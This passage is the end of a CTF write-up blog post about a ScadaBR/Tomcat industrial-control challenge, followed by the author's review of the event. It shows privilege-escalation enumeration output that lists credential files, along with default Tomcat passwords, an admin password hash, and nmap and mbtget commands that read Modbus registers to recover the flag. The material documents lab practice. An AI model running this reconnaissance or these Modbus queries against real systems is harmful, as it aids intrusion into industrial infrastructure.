/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/vo/EventDefinition.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/vo/EventMessage.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/vo/EventNotification.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/ServerStateChecker.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/asciiFile
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/asciiFile/ASCIIFileDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/asciiFile/ASCIIFilePointLocatorRT.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/asciiSerial
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/asciiSerial/ASCIISerialDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/asciiSerial/ASCIISerialPointLocatorRT.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/dnp3
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/dnp3/DNP3Master.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/dnp3/Dnp3DataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/dnp3/Dnp3IpDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/dnp3/Dnp3PointLocatorRT.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/dnp3/Dnp3SerialDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/iec101
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/iec101/IEC101DataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/iec101/IEC101EthernetDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/iec101/IEC101Master.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/iec101/IEC101PointLocatorRT.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/iec101/IEC101SerialDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/opc
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/opc/OPCDataSource.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/rt/dataSource/opc/OPCPointLocatorRT.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/asciiFile
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/asciiFile/ASCIIFileDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/asciiFile/ASCIIFilePointLocatorVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/asciiSerial
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/asciiSerial/ASCIISerialDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/asciiSerial/ASCIISerialPointLocatorVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/dnp3
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/dnp3/Dnp3DataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/dnp3/Dnp3IpDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/dnp3/Dnp3PointLocatorVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/dnp3/Dnp3SerialDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/iec101
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/iec101/IEC101DataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/iec101/IEC101EthernetDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/iec101/IEC101PointLocatorVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/iec101/IEC101SerialDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/opc
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/opc/OPCDataSourceVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/vo/dataSource/opc/OPCPointLocatorVO.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/web
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/web/mvc
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/web/mvc/controller
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/web/mvc/controller/HelpController.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/changeSnippetMap.properties
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/chartSnippetMap.properties
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/Common$ContextKeys.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/Common$GroveServlets.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/Common$TimePeriods.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/Common.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/DataTypes.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/db/BasePooledAccess.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/db/DBConvert.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/com/serotonin/mango/db/DatabaseAccess$DatabaseType$1.class

???????????????????????????????????? Interesting GROUP writable files (not in Home) (max 200)
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                          
  Group tomcat7:                                                                                                                                            
/etc/tomcat7/Catalina                                                                                                                                       
/etc/tomcat7/Catalina/localhost
/var/lib/tomcat7/webapps

                            ?????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????? Other Interesting Files ???????????????????????????????????????????????????????????????????????????????????????                                                                                                                 
                            ?????????????????????????????????????????????????????????????????????????????????                                               
???????????????????????????????????? .sh files in path
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                  
                                                                                                                                                            
???????????????????????????????????? Executable files potentially added by user (limit 70)
2025-06-21+05:43:33.0362090890 /.dockerenv                                                                                                                  

???????????????????????????????????? Unexpected in root
/.dockerenv                                                                                                                                                 

???????????????????????????????????? Modified interesting files in the last 5mins (limit 100)
/tmp/hsperfdata_tomcat7/275                                                                                                                                 
/var/log/tomcat7/localhost_access_log.2025-06-29.txt
/var/log/tomcat7/catalina.out

???????????????????????????????????? Files inside /usr/share/tomcat7 (limit 20)
total 32                                                                                                                                                    
drwxr-xr-x 4 root root 4096 Apr 22  2018 .
drwxr-xr-x 1 root root 4096 Apr 22  2018 ..
drwxr-xr-x 2 root root 4096 Apr 22  2018 bin
-rw-r--r-- 1 root root   39 Feb 18  2016 defaults.md5sum
-rw-r--r-- 1 root root 1958 Feb 18  2016 defaults.template
drwxr-xr-x 2 root root 4096 Apr 22  2018 lib
-rw-r--r-- 1 root root   53 Feb 18  2016 logrotate.md5sum
-rw-r--r-- 1 root root  118 Feb 18  2016 logrotate.template

???????????????????????????????????? Files inside others home (limit 20)
                                                                                                                                                            
???????????????????????????????????? Searching installed mail applications
                                                                                                                                                            
???????????????????????????????????? Mails (limit 50)
                                                                                                                                                            
???????????????????????????????????? Backup folders
drwxr-xr-x 2 root root 4096 Apr 12  2016 /var/backups                                                                                                       
total 0

???????????????????????????????????? Backup files (limited 100)
-rw-r--r-- 1 root root 610 Apr 21  2018 /etc/xml/catalog.old                                                                                                
-rw-r--r-- 1 root root 673 Apr 21  2018 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 128 Apr 21  2018 /var/lib/sgml-base/supercatalog.old

???????????????????????????????????? Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/nssdb/cert9.db: SQLite 3.x database                                                                                                          
Found /var/lib/nssdb/key4.db: SQLite 3.x database
Found /var/lib/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
Found /var/lib/tomcat7/webapps/ScadaBR/images/Thumbs.db: Microsoft Thumbs.db [arrow_in.png, application_form.png, accept.png, add.png, arrow_down_thin.png, arrow_out.png, arrow_up_thin.png, bell.png, bell_add.png, bell_delete.png, bin.png, book.png, book_add.png, book_delete.png, brick_go.png, brick_stop.png, bricks.png, bullet_add.png, bullet_black.png, bullet_delete.png, bullet_down.png, bullet_go.png, bullet_go_left.png, bullet_key.png, bullet_picture.png, cancel.png, chart_line_edit.png, clock.png, clock_add.png, clock_disabled.png, cog.png, cog_add.png, cog_delete.png, cog_edit.png, cog_email.png, cog_process.png, cog_wrench.png, comment.png, comment_add.png, control_play.png, control_play_blue.png, control_repeat.png, control_repeat_blue.png, control_stop.png, control_stop_blue.png, cross.png, cross_doc.png, database_go.png, database_stop.png, delete.png, disconnect.png, email.png, email_go.png, exclamation.png, eye.png, flag_blue.png, flag_blue_off.png, flag_green.png, flag_green_off.png, flag_orange.png, flag_orange_off.png, flag_red.png, flag_red_off.png, flag_white.png, flag_white_off.png, flag_yellow.png, flag_yellow_off.png, folder_add.png, folder_brick.png, graphic.png, help.png, help_doc.png, hourglass.png, house.png, house_link.png, html.png, html_add.png, html_delete.png, icon_arrow_down.png, icon_arrow_up.png, icon_chart.png, icon_comp.png, icon_comp_add.png, icon_comp_delete.png, icon_comp_edit.png, icon_comp_error.png, icon_ds.png, icon_ds_add.png, icon_ds_delete.png, icon_ds_edit.png, icon_ds_error.png, icon_ds_go.png, icon_edit.png, icon_toggle_minus.png, icon_toggle_plus.png, icon_view.png, icon_view_delete.png, icon_view_edit.png, icon_view_new.png, information.png, lightbulb.png, lightbulb_off.png, link.png, link_add.png, link_break.png, logo.gif, logo_icon.gif, logo_sm.gif, magnifier.png, mangoLogoMed.jpg, menu_separator.png, multi_bell.png, multi_bell_add.png, multi_bell_delete.png, multi_bell_disabled.png, pencil.png, plugin.png, plugin_add.png, plugin_delete.png, plugin_edit.png, report.png, report_add.png, report_go.png, right.gif, save.png, save_add.png, script.png, script_code.png, sound_mute.png, sound_none.png, spacer.gif, text.png, thumb_down.png, thumb_up.png, tick.png, tick_off.png, transmit.png, transmit_add.png, transmit_delete.png, transmit_edit.png, transmit_go.png, transmit_stop.png, user.png, user_add.png, user_delete.png, user_disabled.png, user_ds.png, user_green.png, user_suit.png, warn.png, world.png]
Found /var/lib/tomcat7/webapps/ScadaBR/images/viconics/VT7200/Thumbs.db: Microsoft Thumbs.db [
Found /var/lib/tomcat7/webapps/ScadaBR/images/viconics/VT7300/Thumbs.db: Microsoft Thumbs.db [
Found /var/lib/tomcat7/webapps/ScadaBR/images/viconics/VT7600/Thumbs.db: Microsoft Thumbs.db [
Found /var/lib/tomcat7/webapps/ScadaBR/resources/dojo/tests/widget/images/Thumbs.db: Microsoft Thumbs.db [5.jpg, 1.jpg, 2.jpg, 3.jpg, 4.jpg, 6.jpg, check.gif, coccinelle_tanguy_jacq_01.gif, dino_architetto_francesc_04.gif, fisheye_1.png, fisheye_2.png, fisheye_3.png, fisheye_4.png, flatScreen.gif, floppy_frederic_moser_01.gif, giraffe.gif, note.gif, openFolder.gif, plus.gif, question.gif, reply.gif, snake.gif, tab_left.gif, tab_left_r.gif, tab_left_r_curr.gif, tab_right.gif, tab_right_r.gif, tab_right_r_curr.gif, tango-actions-edit-copy.png, tango-actions-edit-cut.png, tango-actions-edit-paste.png, tools.gif, x.gif, graph.gif, create.gif, createsmall.gif, down.gif, downsmall.png, loading.jpg, recyclebin.gif, removesmall.gif, up.gif]

 -> Extracting tables from /var/lib/nssdb/cert9.db (limit 20)
 -> Extracting tables from /var/lib/nssdb/key4.db (limit 20)                                                                                                
                                                                                                                                                            
???????????????????????????????????? Web files?(output limit)
                                                                                                                                                            
???????????????????????????????????? All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 2600 Mar 14  2018 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo                                                                       
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 28  2018 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Apr 22  2018 /etc/.java/.systemPrefs/.system.lock
-rw-r--r-- 1 root root 0 Apr 22  2018 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 tomcat7 tomcat7 77 Oct 26  2010 /var/lib/tomcat7/webapps/ScadaBR/WEB-INF/dox/pt/.directory

???????????????????????????????????? Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                                                           
-rw------- 1 tomcat7 tomcat7 32768 Jun 29 21:41 /tmp/hsperfdata_tomcat7/275                                                                                 

???????????????????????????????????? Searching passwords in history files
                                                                                                                                                            
???????????????????????????????????? Searching *password* or *credential* files in home (limit 70)
/bin/systemd-tty-ask-password-agent                                                                                                                         
/etc/java-8-openjdk/management/jmxremote.password
/etc/pam.d/common-password
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/management/jmxremote.password
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

???????????????????????????????????? Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                            
???????????????????????????????????? Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                            
???????????????????????????????????? Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                            
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2018-02-28 19:13:54 configure base-passwd:amd64 3.5.39 3.5.39
2018-02-28 19:13:54 install base-passwd:amd64 <none> 3.5.39
2018-02-28 19:13:54 status half-configured base-passwd:amd64 3.5.39
2018-02-28 19:13:54 status half-installed base-passwd:amd64 3.5.39
2018-02-28 19:13:54 status installed base-passwd:amd64 3.5.39
2018-02-28 19:13:54 status unpacked base-passwd:amd64 3.5.39
2018-02-28 19:13:55 status half-configured base-passwd:amd64 3.5.39
2018-02-28 19:13:55 status half-installed base-passwd:amd64 3.5.39
2018-02-28 19:13:55 status unpacked base-passwd:amd64 3.5.39
2018-02-28 19:13:55 upgrade base-passwd:amd64 3.5.39 3.5.39
2018-02-28 19:14:00 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2018-02-28 19:14:00 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:00 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:02 configure base-passwd:amd64 3.5.39 <none>
2018-02-28 19:14:02 status half-configured base-passwd:amd64 3.5.39
2018-02-28 19:14:02 status unpacked base-passwd:amd64 3.5.39
2018-02-28 19:14:03 status installed base-passwd:amd64 3.5.39
2018-02-28 19:14:07 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2018-02-28 19:14:07 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:07 status installed passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:07 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:24 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:24 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:24 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2018-02-28 19:14:24 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
2018-02-28 19:14:24 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
2018-02-28 19:14:25 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
2018-02-28 19:14:25 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
2018-02-28 19:14:25 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
2018-02-28 19:14:25 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:

                                ??????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????? API Keys Regex ???????????????????????????????????????????????????????????????????????????????????????????????????                                                                                                  
                                ??????????????????????????????????????????????????????                                                                      
Regexes to search for API keys aren't activated, use param '-r' 
```

`/var/lib/tomcat7/bin` - Writable by my user.

`?????? /dev mounted? .................. Yes` - Breakout via mounts.

Neither seem to be any good.

`cat /var/lib/tomcat7/conf/tomcat-users.xml` - gives me creds but I don’t have access to server-manager.

```
<role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="tomcat" roles="tomcat"/>
  <user username="both" password="tomcat" roles="tomcat,role1"/>
  <user username="role1" password="tomcat" roles="role1"/>

```

I’m exploring all the files and finding nothing. No logs or anything.

`grep -r -I -E 'THM\{[^}]+\}' /path/to/search 2>/dev/null`

`find . -type f -name "flag.txt"`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316849/image_oglau8.png)

The green was originally red…. Maybe all I needed to do was turn it back on - as the hint suggested. And it will give a flag??

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316853/image_rpceva.png)

I don’t know how to read it.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316856/image_lwiqut.png)

```
   "users":[
      {
         "admin":true,
         "disabled":false,
         "email":"admin@yourMangoDomain.com",
         "homeUrl":null,
         "password":"0DPiKuNIrrVmD8IUCuw1hQxNqZc=",
         "phone":"",
         "receiveOwnAuditEvents":false,
         "username":"admin"
```

`admin:0DPiKuNIrrVmD8IUCuw1hQxNqZc=`

Not working on `ssh` but maybe `vnc`? Tried it once then it locked me out.

Going back to `modbus` for a second. I want to try and tap into the `secret` data source - I turned it on, surely I can look at it?

`nmap -p 5020 10.10.189.218`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 18:26 EDT
Nmap scan report for 10.10.189.218
Host is up (0.028s latency).

PORT     STATE SERVICE
5020/tcp open  zenginkyo-1

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

`mbtget -a 0 -n 20 -p 5020 10.10.189.218`

```
values:
  1 (ad 00000):    84
  2 (ad 00001):    72
  3 (ad 00002):    77
  4 (ad 00003):   123
  5 (ad 00004):   109
  6 (ad 00005):   111
  7 (ad 00006):   100
  8 (ad 00007):    98
  9 (ad 00008):   117
 10 (ad 00009):   115
 11 (ad 00010):    95
 12 (ad 00011):   104
 13 (ad 00012):   105
 14 (ad 00013):   100
 15 (ad 00014):   125
 16 (ad 00015):     0
 17 (ad 00016):     0
 18 (ad 00017):     0
 19 (ad 00018):     0
 20 (ad 00019):     0
```

It only goes up to 15, everything after is 0. Those look like ASCII numbers.

```
84 72 77 123 109 111 100 98 117 115 95 104 105 100 125
 T  H  M  {  m   o   d   b   u   s   _   h   i   d  }
```

### Thoughts

Very similar to the v1 challenge that was considered `web` but this one is in a different category - interesting. Lots of red herrings, and the challenge even let’s you get initial foothold again the same way at v1, but that’s not how you get the flag. Very frustrating.

## Overall Experience

This event was an okay experience. As with most events the categories were fairly inaccurate, and the difficulty levels are completely whack. With this event in particular there were a number of Beginner challenges that were unhinged. They had so many rabbit holes for new players to go down, and in some instances I actually spent more time on them than Medium challenges. I think that challenge creators confuse difficulty of a technique, methodology, tool with just straight up trying to trick people. New players are just going to get frustrated with being tricked all the time and give up. Just because the attack vector for a challenge is simple, but then the challenge itself has like four fake outs and rabbit holes does not make it Beginner level. Oh, and the results for the event did not come out right away (took almost two weeks) which was super frustrating because I want to be able to document my score, grab my certificate, write it up and then move on to the next event.

5/10 - might do another TryHackMe event again but it won’t be a priority.

## Lessons Learned

- `/usr/bin/script -qc /bin/bash /dev/null` can be used as a non-Python shell upgrade. It’s not perfect but it came in handy this event.
- Better to team up and screenshare on boxes that are taking more than hour for a sanity check rather than “trying harder”.

## Preparation for Next Time

- More cryptography practice. I’ve recently started the CryptoHack course and I’m hoping to build up a repository of scripts to smash through CTF challenges.
- Get a full team! It’s actually surprisingly hard to find a team of 5, let alone 20 (for some events) of people who can even dedicate 2 hours to this type of event.
- I’m thinking about creating a folder in my home directory of my VM with basically everything you could possibly need for most challenges. Standard wordlists, basic Python cryptography scripts. Might help get through some of the easier challenges faster. In the same sense it would also be an idea to create a ‘CTF Event Cheatsheet’ with all of the most used commands and common tricks to look out for.